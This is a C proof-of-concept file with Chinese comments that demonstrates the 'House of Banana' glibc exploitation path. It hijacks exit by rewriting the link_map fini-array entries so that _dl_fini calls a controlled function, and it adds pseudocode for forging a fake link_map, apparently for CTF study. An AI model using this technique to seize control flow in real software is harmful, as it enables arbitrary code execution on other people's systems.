#define _GNU_SOURCE

#include <assert.h>
#include <dlfcn.h>
#include <elf.h>
#include <link.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

/*
 * House of Banana 最终依赖动态加载器在进程退出时消费 link_map 中的
 * 结束函数数组标签 DT_FINI_ARRAY 与数组长度标签 DT_FINI_ARRAYSZ 的消费逻辑如下：
 *
 *   array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr;
 *   count = l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof(ElfW(Addr));
 *   while (count-- > 0)
 *       ((fini_t) array[count])();  // 把数组元素解释为结束函数指针并调用。
 *
 * 完整攻击会改写 _rtld_global namespace 链并在堆上伪造私有 link_map。
 * 私有字段偏移随 ld.so Build ID 变化，无法写成一个诚实的跨版本任意写 PoC。
 * 这里保留真实 exit -> _dl_fini 消费路径：修改主程序真实 link_map 对应的
 * 两项动态表内容，使它在退出时调用受控 fini_array。
 *
 * 受控 callback 用 _exit(0) 结束进程；若 _dl_fini 没消费伪数组，
 * main 末尾的 exit(113) 会成为非零退出状态。
 */

static void controlled_fini(void)
{
    static const char message[] =
        "[+] exit -> _dl_fini 消费了受控 DT_FINI_ARRAY\n";
    (void)write(STDOUT_FILENO, message, sizeof(message) - 1);
    _exit(0);
}

int main(void)
{
    /* 取得主程序自己的真实 link_map。 */
    void *self_handle = dlopen(NULL, RTLD_NOW);
    assert(self_handle != NULL);

    struct link_map *map = NULL;
    assert(dlinfo(self_handle, RTLD_DI_LINKMAP, &map) == 0);
    assert(map != NULL);
    assert(map->l_ld != NULL);

    ElfW(Dyn) *fini_array_entry = NULL;
    ElfW(Dyn) *fini_array_size_entry = NULL;
    for (ElfW(Dyn) *dyn = map->l_ld; dyn->d_tag != DT_NULL; ++dyn) {
        if (dyn->d_tag == DT_FINI_ARRAY)
            fini_array_entry = dyn;
        else if (dyn->d_tag == DT_FINI_ARRAYSZ)
            fini_array_size_entry = dyn;
    }
    assert(fini_array_entry != NULL);
    assert(fini_array_size_entry != NULL);

    /*
     * ld.so 已把主程序的 PT_DYNAMIC 放进只读映射（常见于 RELRO）。真实漏洞
     * 会用任意写/largebin 投递；教学 PoC 用 mprotect 只模拟“已有该写原语”。
     */
    long page_size = sysconf(_SC_PAGESIZE);
    assert(page_size > 0);
    uintptr_t first = (uintptr_t)fini_array_entry;
    uintptr_t second = (uintptr_t)fini_array_size_entry;
    uintptr_t page_begin = first & ~((uintptr_t)page_size - 1);
    uintptr_t page_end =
        (second + sizeof(*fini_array_size_entry) + (uintptr_t)page_size - 1)
        & ~((uintptr_t)page_size - 1);
    assert(mprotect((void *)page_begin, page_end - page_begin,
                    PROT_READ | PROT_WRITE) == 0);

    /* fini_array 内容必须在退出前一直存活，因此不能放在当前栈帧上。 */
    ElfW(Addr) *fake_array = malloc(sizeof(*fake_array));
    assert(fake_array != NULL);
    fake_array[0] = (ElfW(Addr))(uintptr_t)&controlled_fini;

    /* d_ptr 是相对 l_addr 的虚拟地址；PIE 与非 PIE 都按同一公式处理。 */
    fini_array_entry->d_un.d_ptr =
        (ElfW(Addr))(uintptr_t)fake_array - map->l_addr;
    fini_array_size_entry->d_un.d_val = sizeof(*fake_array);

    /*
     * 不 dlclose，直接进入真实 exit -> _dl_fini。
     * 若 controlled_fini 被调用，它会输出成功信息并 _exit(0)；
     * 若没有被调用，进程最终保留 113 这个失败状态。
     */
    exit(113);
}

/*
 * ======================== fake link_map 伪代码 ========================
 *
 * 上面的可执行部分修改真实主程序 link_map，只为了稳定验证
 * `exit -> _dl_fini -> DT_FINI_ARRAY`。如果题目要求伪造独立 link_map，
 * 必须先按附件 ld.so 确认所有私有偏移，再按下面关系写入：
 *
 *     fake_map.l_addr = 运行时基准；
 *     fake_map.l_next = NULL；
 *     fake_map.l_real = &fake_map；
 *     fake_map.l_init_called = 1；
 *
 *     fake_map.l_info[DT_FINI_ARRAY] = &fake_fini_array_dyn；
 *     fake_map.l_info[DT_FINI_ARRAYSZ] = &fake_fini_array_size_dyn；
 *
 *     fake_fini_array_dyn.d_tag = DT_FINI_ARRAY；
 *     fake_fini_array_dyn.d_ptr = fini_array - fake_map.l_addr；
 *     fake_fini_array_size_dyn.d_tag = DT_FINI_ARRAYSZ；
 *     fake_fini_array_size_dyn.d_val = 8；
 *     fini_array[0] = 受控函数地址；
 *
 *     把命名空间的 _ns_loaded 指向 fake_map；
 *     同步修正 _ns_nloaded；
 *     调用 exit；
 *
 * `l_info`、`l_real` 和 `l_init_called` 都属于 ld.so 私有 ABI，禁止照搬
 * 另一份 libc/ld 的固定偏移。2.42 只封住常用 largebin 投递；若题目另有
 * AAW，这个最终消费路径本身仍可在 2.43 到达。
 */
